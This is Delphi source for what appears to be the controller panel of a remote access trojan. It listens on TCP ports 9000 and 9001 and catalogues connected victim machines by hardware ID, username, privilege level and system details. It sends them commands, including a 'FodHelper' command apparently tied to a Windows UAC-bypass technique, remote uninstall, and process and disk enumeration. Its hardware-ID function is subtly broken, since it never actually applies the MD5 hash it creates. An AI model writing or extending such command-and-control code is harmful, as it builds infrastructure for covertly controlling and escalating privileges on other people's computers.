unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages,
  System.SysUtils, System.Variants, System.Classes,
  System.Generics.Collections,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  Vcl.ComCtrls, Vcl.Menus,
  IdBaseComponent, IdComponent, IdCustomTCPServer, IdTCPServer,
  IdContext, IdGlobal,
  Vcl.Themes, IniFiles, System.IOUtils,
  System.JSON, IdHash, IdHashMessageDigest, System.Types, Winapi.CommCtrl, System.StrUtils,
  ShowDrives, ShowProcesses;

type
  TForm1 = class(TForm)
    ListView1: TListView;
    PopupMenu1: TPopupMenu;
    IdTCPServer1: TIdTCPServer;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure IdTCPServer1Connect(AContext: TIdContext);
    procedure IdTCPServer1Disconnect(AContext: TIdContext);
    procedure IdTCPServer1Execute(AContext: TIdContext);
    procedure SendCommandToClient(const Cmd: string);
    procedure FodHelper1Click(Sender: TObject);
    procedure Restart1Click(Sender: TObject);
    procedure Close1Click(Sender: TObject);
    procedure Uninstall1Click(Sender: TObject);
    procedure GetDiskInfo1Click(Sender: TObject);
    procedure GetRunningProcesses1Click(Sender: TObject);
  private
    FClients: TDictionary<TIdContext, TListItem>;
    procedure AddClient(AContext: TIdContext);
    procedure RemoveClient(AContext: TIdContext);
    procedure AutoSizeListViewColumns();
    procedure UpdateClientInfoFromJSON(AContext: TIdContext; const JSONText: string);
    function ComputeHWID(const Machine, CPU, RAM: string): string;
    procedure CloseClientWindows(const HWID, Username: string);
    // New helper for single-instance forms
    procedure ShowUniqueForm(FormClass: TFormClass; const ClientTitle, JSONStr: string; AContext: TIdContext);
  end;

var
  Form1: TForm1;

const
  IDM_CLEARCLIENTS = WM_USER + 1;
  IDM_ABOUT        = WM_USER + 2;
  LVSCW_AUTOSIZE         = $FFFF;
  LVSCW_AUTOSIZE_USEHEADER = $FFFE;

implementation

{$R *.dfm}

// ===================== Form Setup =====================

procedure TForm1.FormCreate(Sender: TObject);
begin
  FClients := TDictionary<TIdContext, TListItem>.Create;

  // Setup ListView
  ListView1.ViewStyle := vsReport;
  ListView1.Columns.Clear;
  ListView1.Columns.Add.Caption := 'Address';
  ListView1.Columns[0].Width := 100;
  ListView1.Columns.Add.Caption := 'HWID';
  ListView1.Columns[1].Width := 100;
  ListView1.Columns.Add.Caption := 'Machine';
  ListView1.Columns[2].Width := 100;
  ListView1.Columns.Add.Caption := 'User';
  ListView1.Columns[3].Width := 100;
  ListView1.Columns.Add.Caption := 'Privs';
  ListView1.Columns[4].Width := 100;
  ListView1.Columns.Add.Caption := 'System';
  ListView1.Columns[5].Width := 100;
  ListView1.Columns.Add.Caption := 'CPU';
  ListView1.Columns[6].Width := 100;
  ListView1.Columns.Add.Caption := 'RAM';
  ListView1.Columns[7].Width := 100;
  ListView1.Columns.Add.Caption := 'Disk';
  ListView1.Columns[8].Width := 100;

  // Setup Server
  IdTCPServer1.DefaultPort := 9000;
  IdTCPServer1.Bindings.Clear;

  with IdTCPServer1.Bindings.Add do
  begin
    IP := '0.0.0.0';
    Port := 9000;
  end;

  with IdTCPServer1.Bindings.Add do
  begin
    IP := '0.0.0.0';
    Port := 9001;
  end;

  IdTCPServer1.Active := True;
end;

procedure TForm1.FormDestroy(Sender: TObject);
var
  ContextList: TList;
  LContext: TIdContext;
begin
  // 1. DISCONNECT CLIENTS FIRST
  if IdTCPServer1.Active then
  begin
    ContextList := IdTCPServer1.Contexts.LockList;
    try
      for LContext in ContextList do
      begin
        try
          if LContext.Connection.Connected then
            LContext.Connection.Disconnect;
        except
        end;
      end;
    finally
      IdTCPServer1.Contexts.UnlockList;
    end;
  end;

  // 2. CLEAN UP MEMORY
  FClients.Clear;
  FClients.Free;

  // 3. FORCE SERVER DESTRUCTION
  IdTCPServer1.Free;
  IdTCPServer1 := nil;
end;

// ===================== Client List Management =====================

procedure TForm1.AddClient(AContext: TIdContext);
var
  Item: TListItem;
  IPAddress: string;
  Port: Integer;
begin
  TThread.Queue(nil,
    procedure
    begin
      Item := ListView1.Items.Add;
      IPAddress := AContext.Binding.PeerIP;
      Port := AContext.Binding.PeerPort;
      Item.Caption := Format('%s:%d', [IPAddress, Port]);

      while Item.SubItems.Count < 8 do
        Item.SubItems.Add('');

      Item.Data := AContext;
      FClients.Add(AContext, Item);
    end);
end;

procedure TForm1.RemoveClient(AContext: TIdContext);
var
  Item: TListItem;
  HWID, Username: string;
begin
  TThread.Synchronize(nil,
    procedure
    begin
      if FClients.TryGetValue(AContext, Item) then
      begin
        HWID := 'Unknown';
        Username := 'Unknown';

        if Item.SubItems.Count > 0 then
          HWID := Item.SubItems[0];
        if Item.SubItems.Count > 2 then
          Username := Item.SubItems[2];

        CloseClientWindows(HWID, Username);

        Item.Delete;
        FClients.Remove(AContext);
      end;
    end);
end;

procedure TForm1.CloseClientWindows(const HWID, Username: string);
var
  TargetTitle: string;
  I: Integer;
begin
  TargetTitle := Username + '@' + HWID;

  for I := Screen.CustomFormCount - 1 downto 0 do
  begin
    if Pos(TargetTitle, Screen.CustomForms[I].Caption) > 0 then
    begin
      Screen.CustomForms[I].Close;
    end;
  end;
end;

// Helper to ensure only 1 form of a type per client exists
procedure TForm1.ShowUniqueForm(FormClass: TFormClass; const ClientTitle, JSONStr: string; AContext: TIdContext);
var
  I: Integer;
  OldForm: TCustomForm;
begin
  // 1. Find and close existing forms of this class for this client
  for I := Screen.CustomFormCount - 1 downto 0 do
  begin
    OldForm := Screen.CustomForms[I];
    // Check if it matches the class type AND the client title
    if (OldForm is FormClass) and (Pos(ClientTitle, OldForm.Caption) > 0) then
    begin
      OldForm.Close; // This sets Action to caFree in our forms
    end;
  end;

  // 2. Create the new form
  if FormClass = TfrmShowDrives then
    TfrmShowDrives.ShowDrives(ClientTitle, JSONStr)
  else if FormClass = TfrmShowProcesses then
    TfrmShowProcesses.ShowProcesses(ClientTitle, JSONStr, AContext);
end;

procedure TForm1.AutoSizeListViewColumns;
var
  i: Integer;
begin
  for i := 0 to ListView1.Columns.Count - 1 do
  begin
    SendMessage(ListView1.Handle, LVM_SETCOLUMNWIDTH, i, LVSCW_AUTOSIZE);
    SendMessage(ListView1.Handle, LVM_SETCOLUMNWIDTH, i, LVSCW_AUTOSIZE_USEHEADER);
  end;
end;

// ===================== TCP Server Events =====================

procedure TForm1.IdTCPServer1Connect(AContext: TIdContext);
begin
  AContext.Connection.IOHandler.DefStringEncoding := IndyTextEncoding_UTF8;
  AddClient(AContext);
end;

procedure TForm1.IdTCPServer1Disconnect(AContext: TIdContext);
begin
  RemoveClient(AContext);
end;

function DetectJSONType(const JSONStr: string): string;
var
  jValue: TJSONValue;
  jArr: TJSONArray;
  jObj: TJSONObject;
begin
  Result := 'Unknown';
  jValue := TJSONObject.ParseJSONValue(JSONStr);
  try
    if (jValue <> nil) and (jValue is TJSONArray) then
    begin
      jArr := TJSONArray(jValue);
      if jArr.Count > 0 then
      begin
        if jArr.Items[0] is TJSONObject then
        begin
          jObj := TJSONObject(jArr.Items[0]);
          if jObj.GetValue<string>('drive', '') <> '' then
            Result := 'Drives'
          else if jObj.GetValue<string>('process', '') <> '' then
            Result := 'Processes';
        end;
      end;
    end;
  finally
    jValue.Free;
  end;
end;

function GetSelectedClientTitle: string;
var
  TempUser, TempHWID: string;
begin
  TempUser := 'Unknown';
  TempHWID := 'Unknown';

  TThread.Synchronize(nil,
    procedure
    begin
      if (Form1.ListView1.Selected <> nil) then
      begin
        if Form1.ListView1.Selected.SubItems.Count > 0 then
          TempHWID := Form1.ListView1.Selected.SubItems[0];
        if Form1.ListView1.Selected.SubItems.Count > 2 then
          TempUser := Form1.ListView1.Selected.SubItems[2];
      end;
    end);

  Result := TempUser + '@' + TempHWID;
end;

procedure TForm1.IdTCPServer1Execute(AContext: TIdContext);
var
  Line, JsonPayload, DataType, ClientTitle: string;
  jVal: TJSONValue;
  jObj: TJSONObject;
  Msg: string;
begin
  if not IdTCPServer1.Active then Exit;

  while AContext.Connection.IOHandler.CheckForDataOnSource(100) do
  begin
    if not IdTCPServer1.Active then Exit;

    try
      Line := AContext.Connection.IOHandler.ReadLn(IndyTextEncoding_UTF8);

      if Line.StartsWith('INFO|') then
      begin
        UpdateClientInfoFromJSON(AContext, Copy(Line, 6, MaxInt));
      end
      else if Line.StartsWith('OUT|') then
      begin
        JsonPayload := Copy(Line, 5, MaxInt);
        DataType := DetectJSONType(JsonPayload);
        ClientTitle := GetSelectedClientTitle;

        if DataType = 'Drives' then
        begin
          TThread.Queue(nil, TThreadProcedure(
            procedure
            begin
              ShowUniqueForm(TfrmShowDrives, ClientTitle, JsonPayload, nil);
            end));
        end
        else if DataType = 'Processes' then
        begin
          TThread.Queue(nil, TThreadProcedure(
            procedure
            begin
              ShowUniqueForm(TfrmShowProcesses, ClientTitle, JsonPayload, AContext);
            end));
        end
        else
        begin
          // Handle Status Messages
          jVal := TJSONObject.ParseJSONValue(JsonPayload);
          try
            if (jVal <> nil) and (jVal is TJSONObject) then
            begin
              jObj := TJSONObject(jVal);
              if jObj.GetValue<string>('status', '') <> '' then
              begin
                Msg := jObj.GetValue<string>('message', 'Operation completed.');

                TThread.Queue(nil, TThreadProcedure(
                  procedure
                  var
                    I: Integer; // Loop variable declared INSIDE the procedure
                  begin
                    ShowMessage(Msg);

                    // Refresh the Process List
                    for I := 0 to Screen.CustomFormCount - 1 do
                    begin
                      if Screen.CustomForms[I] is TfrmShowProcesses then
                      begin
                        if Pos(ClientTitle, Screen.CustomForms[I].Caption) > 0 then
                        begin
                          TfrmShowProcesses(Screen.CustomForms[I]).RefreshList;
                          Break;
                        end;
                      end;
                    end;
                  end));
              end;
            end;
          finally
            jVal.Free;
          end;
        end;
      end;
    except
      on E: Exception do
      begin
        if IdTCPServer1.Active then
        begin
          TThread.Queue(nil, TThreadProcedure(
            procedure
            begin
              ShowMessage('Error: ' + E.Message);
            end));
        end
        else
          Exit;
      end;
    end;
  end;
end;

// ===================== Command Handling =====================

procedure TForm1.SendCommandToClient(const Cmd: string);
var
  Item: TListItem;
  Context: TIdContext;
begin
  if ListView1.Selected = nil then Exit;
  Item := ListView1.Selected;
  Context := TIdContext(Item.Data);
  TThread.CreateAnonymousThread(
    procedure
    begin
      try
        Context.Connection.IOHandler.WriteLn(Cmd);
      except
        on E: Exception do
          TThread.Queue(nil, procedure
          begin
            ShowMessage('Failed to send command: ' + E.Message);
          end);
      end;
    end).Start;
end;

procedure TForm1.FodHelper1Click(Sender: TObject);
begin
  SendCommandToClient('FodHelper');
end;

procedure TForm1.Restart1Click(Sender: TObject);
begin
  SendCommandToClient('Restart');
end;

procedure TForm1.Close1Click(Sender: TObject);
begin
  SendCommandToClient('Close');
end;

procedure TForm1.Uninstall1Click(Sender: TObject);
begin
  SendCommandToClient('Uninstall');
end;

procedure TForm1.GetDiskInfo1Click(Sender: TObject);
begin
  SendCommandToClient('GetDiskInfo');
end;

procedure TForm1.GetRunningProcesses1Click(Sender: TObject);
begin
  SendCommandToClient('GetRunningProcesses');
end;

// ===================== JSON Handling & HWID Calculation =====================

procedure TForm1.UpdateClientInfoFromJSON(AContext: TIdContext; const JSONText: string);
var
  JsonVal: TJSONValue;
  JsonObj, DiskObj: TJSONObject;
  Username, OSStr, CPU, RAM, HWID, Machine, Privileges: string;
  Disk, DiskInfoStr: string;
  DiskArr: TJSONArray;
  DiskEntry: TJSONObject;
  Item: TListItem;
  CapturedContext: TIdContext;
  InnerVal: TJSONValue;
begin
  CapturedContext := AContext;

  TThread.CreateAnonymousThread(
    procedure
    var
      I: Integer; // Loop variable declared INSIDE the anonymous thread
    begin
      try
        JsonVal := TJSONObject.ParseJSONValue(JSONText);
        if not Assigned(JsonVal) then Exit;
        if not (JsonVal is TJSONObject) then Exit;

        JsonObj := TJSONObject(JsonVal);

        if Assigned(JsonObj.GetValue('username')) then
          Username := JsonObj.GetValue('username').Value
        else Username := 'N/A';

        if Assigned(JsonObj.GetValue('os')) then
          OSStr := JsonObj.GetValue('os').Value
        else OSStr := 'N/A';

        if Assigned(JsonObj.GetValue('cpu')) then
          CPU := JsonObj.GetValue('cpu').Value
        else CPU := 'N/A';

        if Assigned(JsonObj.GetValue('ram')) then
          RAM := JsonObj.GetValue('ram').Value
        else RAM := 'N/A';

        if Assigned(JsonObj.GetValue('machine')) then
          Machine := JsonObj.GetValue('machine').Value
        else Machine := 'N/A';

        if Assigned(JsonObj.GetValue('privileges')) then
          Privileges := JsonObj.GetValue('privileges').Value
        else Privileges := 'N/A';

        HWID := ComputeHWID(Machine, CPU, RAM);

        Disk := 'N/A';
        if Assigned(JsonObj.GetValue('disk')) then
        begin
          DiskObj := JsonObj.GetValue('disk') as TJSONObject;
          if Assigned(DiskObj.GetValue('disk_info')) then
          begin
            DiskInfoStr := DiskObj.GetValue('disk_info').Value;
            InnerVal := TJSONObject.ParseJSONValue(DiskInfoStr);
            try
              if Assigned(InnerVal) and (InnerVal is TJSONArray) then
              begin
                DiskArr := TJSONArray(InnerVal);
                if DiskArr.Size > 0 then
                begin
                  Disk := '';
                  for I := 0 to DiskArr.Size - 1 do
                  begin
                    if DiskArr.Get(I) is TJSONObject then
                    begin
                      DiskEntry := TJSONObject(DiskArr.Get(I));
                      Disk := Disk +
                              DiskEntry.GetValue('drive').Value + ': ' +
                              DiskEntry.GetValue('free_percent').Value + '% | ';
                    end;
                  end;
                  if Disk.EndsWith(' | ') then
                    Disk := Copy(Disk, 1, Length(Disk) - 3);
                end;
              end;
            finally
              InnerVal.Free;
            end;
          end;
        end;

        TThread.Queue(nil, TThreadProcedure(
          procedure
          begin
            if FClients.TryGetValue(CapturedContext, Item) then
            begin
              while Item.SubItems.Count < 8 do
                Item.SubItems.Add('');

              Item.SubItems[0] := HWID;
              Item.SubItems[1] := Machine;
              Item.SubItems[2] := Username;
              Item.SubItems[3] := Privileges;
              Item.SubItems[4] := OSStr;
              Item.SubItems[5] := CPU;
              Item.SubItems[6] := RAM;
              Item.SubItems[7] := Disk;

              AutoSizeListViewColumns;
            end
          end));
      finally
        JsonVal.Free;
      end;
    end).Start;
end;

function TForm1.ComputeHWID(const Machine, CPU, RAM: string): string;
var
  Source: string;
  MD5: TIdHashMessageDigest5;
  HashBytes: TIdBytes;
  I: Integer;
  HashStr: string;
begin
  try
    Source := Format('%s|%s|%s', [Machine, CPU, RAM]);
    MD5 := TIdHashMessageDigest5.Create;
    try
      HashBytes := TIdBytes(TEncoding.UTF8.GetBytes(Source));
      HashStr := '';
      for I := 0 to High(HashBytes) do
        HashStr := HashStr + IntToHex(HashBytes[I], 2);
      Result := Copy(UpperCase(HashStr), 1, 20);
    finally
      MD5.Free;
    end;
  except
    on E: Exception do
      Result := 'Error: ' + E.Message;
  end;
end;

end.
